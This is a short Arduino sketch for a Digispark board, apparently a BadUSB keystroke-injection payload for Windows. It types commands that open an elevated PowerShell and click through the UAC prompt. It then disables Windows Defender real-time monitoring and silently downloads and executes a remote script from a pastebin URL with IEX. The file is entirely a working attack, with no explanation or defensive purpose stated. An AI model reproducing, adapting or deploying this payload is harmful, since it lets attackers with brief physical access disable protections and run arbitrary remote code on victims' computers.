#include "DigiKeyboard.h"
void setup() {}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true"); 
  DigiKeyboard.delay(200);
  DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/KyWVEpky');\"");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("exit");
  for(;;){ }
}
